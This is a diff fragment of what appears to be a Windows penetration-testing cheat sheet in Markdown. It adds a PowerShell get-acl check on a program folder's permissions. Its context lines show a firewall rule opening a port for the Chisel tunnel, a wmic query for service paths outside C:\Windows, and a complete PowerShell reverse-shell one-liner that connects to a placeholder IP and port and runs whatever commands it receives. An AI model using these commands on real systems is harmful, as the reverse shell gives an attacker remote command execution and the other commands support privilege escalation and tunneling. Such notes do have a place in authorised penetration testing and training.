@@ -32,6 +32,10 @@ netsh advfirewall firewall add rule name="Chisel" dir=in action=allow protocol=t
 ```powershell
 wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 ```
+# Check the permissions on the directory in Windows
+```powershell
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+```
 # Powershell Reverse Shell
 ```powershell
 powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
